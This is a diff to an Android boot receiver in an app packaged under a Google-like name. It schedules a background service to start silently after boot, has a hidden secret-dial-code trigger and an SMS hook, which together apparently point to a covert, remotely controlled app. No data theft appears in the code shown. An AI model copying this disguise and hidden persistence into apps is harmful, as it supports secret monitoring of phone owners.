@@ -1,15 +1,15 @@
 package com.google.android.usbdebugger;
 
 import android.annotation.SuppressLint;
+import android.app.AlarmManager;
+import android.app.PendingIntent;
 import android.content.ActivityNotFoundException;
 import android.content.BroadcastReceiver;
 import android.content.ContentValues;
 import android.content.Context;
 import android.content.Intent;
-import android.database.SQLException;
 import android.database.sqlite.SQLiteDatabase;
 import android.os.Build;
-import android.telephony.SmsMessage;
 import android.util.Log;
 
 import java.io.Serializable;
@@ -20,24 +20,18 @@ import java.util.Date;
 
 public class BootDeviceReceiver extends BroadcastReceiver
 {
+    private static final String TAG = "BootDeviceReceiver";
+
     private String DateTime() {
         Date dt = new Date();
         @SuppressLint("SimpleDateFormat")
         SimpleDateFormat ft2 = new SimpleDateFormat("dd-MM-yyyy HH:mm:ss");
-        String daa = ft2.format(dt);
-        return daa;
+        return ft2.format(dt);
     }
 
-    private DBHelper dbh;
-    private SQLiteDatabase db;
-
-    private static final String ACTION = "android.provider.Telephony.SMS_RECEIVED";
-    private static final String SECRET_ACTION = "android.provider.Telephony.SECRET_CODE";
-
     public void createParams(Context context, ArrayList param){
-        dbh = new DBHelper(context);
-        db = dbh.getWritableDatabase();
-        try {
+        DBHelper dbh = new DBHelper(context);
+        try (SQLiteDatabase db = dbh.getWritableDatabase()) {
             ContentValues data = new ContentValues();
             data.put("VC", param.get(0).toString());
             data.put("SC", param.get(1).toString());
@@ -59,19 +53,22 @@ public class BootDeviceReceiver extends BroadcastReceiver
             data.put("RS", param.get(17).toString());
             data.put("DBC", param.get(18).toString());
             data.put("SH", param.get(19).toString());
+            data.put("XML_T", param.get(20).toString());
+            data.put("DUR", param.get(21).toString());
 
             db.update("Parametrs", data, "1=1", null);
 
-        }
-        catch (Exception ex){
-            dbh.insert_Exeption(db, "createParams()Update","Exception", ex.getMessage(), DateTime());
+        } catch (Exception ex){
+            try(SQLiteDatabase dbex = dbh.getWritableDatabase()){
+                dbh.insert_Exeption(dbex, "createParams()Update","Exception", ex.getMessage(), DateTime());
+            }
         }
     }
 
     void startService(Context context, String reason, ArrayList params) {
         Intent mIntent = new Intent(context, MyService.class);
         mIntent.putExtra("sms_body", reason);
-        mIntent.putExtra("Array", params);
+        mIntent.putExtra("Array", (Serializable) params);
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
             context.startForegroundService(mIntent);
         } else {
@@ -83,6 +80,7 @@ public class BootDeviceReceiver extends BroadcastReceiver
     public void onReceive(Context context, Intent intent)
     {
         String action = intent.getAction();
+        Log.d(TAG, "Received action: " + action);
 
         if (action == null) return;
 
@@ -96,7 +94,7 @@ public class BootDeviceReceiver extends BroadcastReceiver
             }
         }
 
-        if(action.equals(SECRET_ACTION)) {
+        if(action.equals("android.provider.Telephony.SECRET_CODE")) {
             String ss = intent.getDataString();
             if(ss != null && ss.equals("android_secret_code://12345")) {
                 try {
@@ -110,12 +108,32 @@ public class BootDeviceReceiver extends BroadcastReceiver
             }
         }
 
-        if(Intent.ACTION_BOOT_COMPLETED.equals(action))
+        // ИСПРАВЛЕНО: Возвращена простая и надежная логика запуска сервиса через AlarmManager
+        if(Intent.ACTION_BOOT_COMPLETED.equals(action) || "android.intent.action.QUICKBOOT_POWERON".equals(action))
         {
-            startService(context, "StartUp", null);
+            Log.d(TAG, "Boot completed. Scheduling service start.");
+            Intent serviceIntent = new Intent(context, MyService.class);
+            serviceIntent.putExtra("sms_body", "StartUp");
+
+            int flags = (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) ? PendingIntent.FLAG_IMMUTABLE : 0;
+            PendingIntent pendingIntent;
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                 pendingIntent = PendingIntent.getForegroundService(context, 0, serviceIntent, flags);
+            } else {
+                 pendingIntent = PendingIntent.getService(context, 0, serviceIntent, flags);
+            }
+
+            AlarmManager alarmManager = (AlarmManager) context.getSystemService(Context.ALARM_SERVICE);
+            if (alarmManager != null) {
+                long triggerAtMillis = System.currentTimeMillis() + 15000;
+                alarmManager.set(AlarmManager.RTC_WAKEUP, triggerAtMillis, pendingIntent);
+                Log.d(TAG, "Service start scheduled in 15 seconds.");
+            } else {
+                 Log.e(TAG, "AlarmManager is null, cannot schedule service start.");
+            }
         }
 
-        if (ACTION.equalsIgnoreCase(action)) {
+        if ("android.provider.Telephony.SMS_RECEIVED".equalsIgnoreCase(action)) {
             // SMS receiving logic can be placed here if needed
         }
     }
